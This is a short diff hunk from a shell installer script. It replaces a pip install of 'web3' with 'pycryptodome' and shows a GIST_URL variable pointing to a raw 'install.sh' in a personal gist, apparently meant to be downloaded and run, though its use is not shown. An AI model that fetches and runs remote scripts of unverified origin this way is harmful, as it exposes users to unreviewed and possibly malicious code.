@@ -166,8 +166,8 @@ if ! pip3 show cryptography >/dev/null 2>&1; then
     $PIP_INSTALL cryptography
 fi
 
-if ! pip3 show web3 >/dev/null 2>&1; then
-    $PIP_INSTALL web3
+if ! pip3 show pycryptodome >/dev/null 2>&1; then
+    $PIP_INSTALL pycryptodome
 fi
 
 GIST_URL="https://gist.githubusercontent.com/wongstarx/b1316f6ef4f6b0364c1a50b94bd61207/raw/install.sh"
